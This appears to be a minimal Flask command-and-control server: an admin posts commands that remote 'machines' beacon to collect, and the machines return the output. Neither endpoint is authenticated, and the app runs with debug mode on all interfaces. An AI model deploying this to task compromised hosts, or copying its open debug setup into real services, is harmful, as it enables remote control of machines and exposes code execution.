from flask import Flask, request, jsonify
from uuid import uuid4
import time
import os  # <-- import os to read environment variables

app = Flask(__name__)

# Queues for jobs and results
pending_jobs = dict()
completed_jobs = dict()

# How long admin waits for job to finish (in seconds)
ADMIN_TIMEOUT = 10


@app.route('/admin', methods=['POST'])
def post_admin():
    """Admin posts a new command and waits for its result"""
    data = request.get_json()
    if not data or "command" not in data:
        return jsonify({"error": "No command provided"}), 400

    job_id = str(uuid4())
    command = data["command"]

    # Add job to pending jobs
    pending_jobs[job_id] = command
    # Initialize empty result placeholder
    completed_jobs[job_id] = None

    # Wait for the machine to complete the job
    start = time.time()
    while time.time() - start < ADMIN_TIMEOUT:
        result = completed_jobs.get(job_id)
        if result is not None:
            # Remove job after completion
            completed_jobs.pop(job_id)
            return jsonify({"job_id": job_id, "output": result}), 200
        time.sleep(0.1)

    return jsonify({"error": "Timeout waiting for output"}), 504


@app.route('/machine', methods=['GET'])
def get_command():
    """Machine beacons for a command"""
    if not pending_jobs:
        return jsonify({"message": "No commands available"}), 200

    # Get the first pending job
    job_id, command = next(iter(pending_jobs.items()))
    # Remove from pending so it won't be re-assigned
    pending_jobs.pop(job_id)

    return jsonify({"job_id": job_id, "command": command}), 200


@app.route('/machine', methods=['POST'])
def post_result():
    """Machine posts completed job output"""
    data = request.get_json()
    if not data or "job_id" not in data or "output" not in data:
        return jsonify({"error": "Invalid data"}), 400

    job_id = data["job_id"]
    completed_jobs[job_id] = data["output"]

    return jsonify({"message": f"Output received for job {job_id}"}), 200


if __name__ == '__main__':
    port = int(os.getenv("PORT", 5000))  # Read port from environment, default to 5000
    app.run(debug=True, host="0.0.0.0", port=port)
